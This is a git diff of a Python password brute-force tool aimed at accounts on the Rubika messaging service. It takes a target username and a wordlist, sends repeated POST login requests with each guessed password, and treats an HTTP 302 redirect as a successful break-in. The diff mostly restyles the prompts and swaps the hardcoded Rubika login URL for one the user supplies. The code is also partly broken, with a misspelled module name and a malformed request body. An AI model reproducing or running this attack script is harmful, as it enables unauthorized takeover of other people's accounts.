@@ -74,7 +74,7 @@ dX.  9Xb      .dXb     __                     __    dXb.   dXP   .Xb
                     
 
 
- please enter username target- type user ⟩⟩ {colorma.END}""")
+{colorama.BLUE} ⟩⟩ [{name}] ⟩⟩ {colorama.GREEN}please enter username target- type user ⟩⟩ {colorma.END}""")
 print ()
 users = user.split(".")
 try:
@@ -89,10 +89,10 @@ try:
             print(f"{colorma.RED}[X] Error 404 : Not This Link Target For Database Rubika{colorma.END}")
         elif(stats.status_code == 200):
             print(f"{colorma.GREEN}[+] Alert : Find Link Target For Database Rubika True{colorma.END}")
-            sd = input(f"{colorma.YELLOW}[?] Do you have a list Cods or should I use my list password [y/n]:>{colorma.END} ")
-            if(sd == "y"):
+            sd = input(f"{colorma.YELLOW}[?] Do you have a list Cods or should I use my list password [y/n] ⟩⟩ {colorma.END} ")
+            if(sd == "y".lower()):
                 worldlist = input(f"{colorma.YELLOW}[?] Please Enter Path Codes List :>{colorma.END} ")
-            elif(sd == "n"):
+            elif(sd == "n".lower()):
                 worldlist = "cod.txt"
             else:
                 print(f"{colorma.RED}[X] Error Index{colorma.END}")
@@ -100,15 +100,15 @@ try:
             try:
                 shekan = True
                 wordlist = open(worldlist,"r").read().split()
-                print(f"\r{colorma.GREEN}[+] Alert : 5s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] start > 5s",end="",flush=False) 
                 time.sleep(1)
-                print(f"\r{colorma.GREEN}[+] Alert : 4s",end="",flush=False)
+                print(f"\r{colorma.GREEN}[+] Alert >> 4s",end="",flush=False)
                 time.sleep(1) 
-                print(f"\r{colorma.END}[+] Alert : 3s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] Alert >>> 3s",end="",flush=False) 
                 time.sleep(1)
-                print(f"\r{colorma.RED}[+] Alert : 2s",end="",flush=False) 
+                print(f"\r{colorma.GREEN}[+] Alert >>>> 2s",end="",flush=False) 
                 time.sleep(1)
-                print(f"\r{colorma.RED}[+] Alert : 1s\r") 
+                print(f"\r{colorma.GREEN}[+] Alert >>>> 1s\r") 
                 time.sleep(1)
 
                 usd = users[0].split("/")
@@ -116,8 +116,8 @@ try:
 
                 while shekan:
                     for word in wordlist:
-                        Target = requests.post("https://web.rubika.ir/#login/",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
-                        # Target = requests.post("http://web.rubika.ir/#im?um=",data={"usrid":{users},"ups":word,"sub":"submit"}).text
+                        Target = requests.post(f"{user}",data=f"_tt=187902&usrid={users}&ups={word}&btnSubmit=%D9%88%D8%B1%D9%88%D8%AF+%D8%A8%D9%87+%D8%A8%D8%AE%D8%B4+%D9%85%D8%AF%DB%8C%D8%B1%DB%8C%D8%AA+%D9%88%D8%A8%D9%84%D8%A7%DA%AF")
+                        # _
 
                         try:
                             if(Target.status_code == 302):
